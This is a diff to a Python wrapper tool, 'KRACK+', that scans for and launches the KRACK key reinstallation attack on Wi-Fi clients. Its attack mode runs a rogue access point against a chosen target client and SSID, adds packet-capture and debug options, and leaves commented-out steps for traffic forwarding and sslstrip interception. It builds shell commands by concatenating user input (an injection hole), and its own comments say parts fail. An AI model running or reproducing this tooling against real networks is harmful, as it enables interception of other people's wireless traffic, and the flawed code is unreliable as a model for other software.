@@ -4,11 +4,11 @@ import optparse
 import subprocess
 import atexit
 import logging
+# to move pcap files
+import shutil
+import os
 # to implement progress bar.
 import click
-#from parser import attackParser
-#from parser import scanParser
-#from parser import writeResults
 from parser import *
 from multiprocessing import Process
 from colorlog import ColoredFormatter
@@ -59,6 +59,8 @@ def main():
                         "channel of the target AP. Should be your secondary NIC, i.e USB NIC.", dest='mon')
     parser.add_option('--nic-rogue-ap', default=nic_rogue, help="This option is used to specify Wireless monitor interface that will run a rogue AP"
                         "using a modified hostapd.", dest='rogue')
+    parser.add_option('--pcap', help="Save packet capture to file as a pcap. Provide a filename; $NIC.pcap will be appended to the name. Not compatible with --dd", dest='pcap')
+
 
     # KRACK+ Scan options
     parser.add_option('--scan','-s', help="This option will create a network with SSID 'testnetwork' where the default password is 'abcdefgh'."
@@ -66,13 +68,14 @@ def main():
     parser.add_option('--set-ssid', default='testnetwork', help="Use this option to set the SSID for the created network.", dest='ssid')
     parser.add_option('--set-password', default='abcdefgh', help="Use this option to set the password for the created network."
                       " Password length has to be 8 characters or more!", dest='password')
-    parser.add_option('-d', help="This option will increase output verbosity for KRACK+ Scan", dest='debug', action='store_true')
-    parser.add_option('--dd', help="This option will increase output verbosity even more for KRACK+ Scan (debugging purposes).", dest='dd', action='store_true')
     parser.add_option('--path', '-p', help="Set path where scan report should be saved", dest='path')
 
 
     # General KRACK+ options:
     parser.add_option('--restore', '-r', help="This option will restore internet connection (wifi). Hopefully you'll never have to use this option.", dest='restore', default=False, action='store_true')
+    parser.add_option('-d', help="This option will increase output verbosity for KRACK+ Scan or Attack", dest='debug', action='store_true')
+    parser.add_option('--dd', help="This option will increase output verbosity even more for KRACK+ Scan or Attack (debugging purposes). Can be combined with -d", dest='dd', action='store_true')
+
     
     options, args = parser.parse_args()
     
@@ -113,7 +116,7 @@ def main():
                 	subprocess.call(["./genPDF.py " + options.path], shell=True)
 			log.info("PDF generated in '" + options.path + "'.")
 		else: 
-			subprocess.call("./genPDF.py")	
+                	subprocess.call(["./genPDF.py " + path], shell=True)
 			log.info("PDF generated in '" + path + "'.")
                 subprocess.call(["rm scanOutput.txt"], shell=True)
                 subprocess.call(["rm scannedMacIP.txt"], shell=True)
@@ -130,14 +133,36 @@ def main():
     elif options.attack and options.mon and options.rogue and options.target and options.targetSSID and not options.scan:
         try:
             print("Performing key reinstallation attack")
+
             #Sets up dependencies before the attack script runs
             subprocess.call(["./prepareClientAttack.sh"])         
             with open('./attackOutput.txt', 'w') as attackOutput:
+		
+		# Gives 
+		if options.pcap and (options.dd or options.debug):		
+			raise KeyboardInterrupt("ERROR: cannot combine pcap with -d or --dd")
+			
                 # Subprocess runs script from Vanhoef's repository, to avoid problems with the temporary files his script creates
-                subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
+		elif options.dd:
+			# Runs attack with debug enabled
+		        subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
+		                         options.mon + " " + options.targetSSID + " --target " + options.target + " --debug &"], stdout=attackOutput, shell=True)
+			
+		elif options.pcap:
+			# TODO creates a file, but fails to move it. Also haven't verified that it contains anything of interest. 
+			# Saves pcap from attack to file. 
+			subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
+                                 options.mon + " " + options.targetSSID + " --target " + options.target + " --dump " + options.pcap + " &"], stdout=attackOutput, shell=True)
+			source=os.listdir("./krackattacks-poc-zerokey/krackattack/")
+			destination="reports/"
+			for files in source:
+				if files.endswith(".pcap"):
+					shutil.move(files, destination)
+
+		else: 
+			subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
                                  options.mon + " " + options.targetSSID + " --target " + options.target + " &"], stdout=attackOutput, shell=True)
-                # Usually not necesary to cd to run a script, however Vanhoef's implementation requires it, otherwise we would have to alter his code.
- 	
+
 		# TODO these must be activated, otherwise user must run these commands manually
                 #subprocess.call(["./krackattacks-poc-zerokey/krackattack/enable_internet_forwarding.sh &"])
                 #subprocess.call(["sslstrip -w sslstrip.log &"])
@@ -148,16 +173,17 @@ def main():
 		else:            	
 			attackParser()
 
-        except KeyboardInterrupt:
+        except KeyboardInterrupt, e:
    	    subprocess.call(["clear"], shell=True)
+	    print e
             log.info("Cleaning up and restoring wifi ...")
-	    #subprocess.call(["rm attackOutput.txt"], shell=True)
+	    subprocess.call(["rm attackOutput.txt"], shell=True)
             subprocess.call(["./restoreClientWifi.sh"])
-	except:
-	    subprocess.call(["clear"], shell=True)
-            log.info("Error occurred. Restoring wifi ...")
-            #subprocess.call(["rm attackOutput.txt"], shell=True)
-            subprocess.call(["./restoreClientWifi.sh"])
+	#except:
+	#    subprocess.call(["clear"], shell=True)
+        #    log.info("Error occurred. Restoring wifi ...")
+        #    subprocess.call(["rm attackOutput.txt"], shell=True)
+        #    subprocess.call(["./restoreClientWifi.sh"])
 
     ############# RESTORE INTERNET ################        
     elif options.restore:
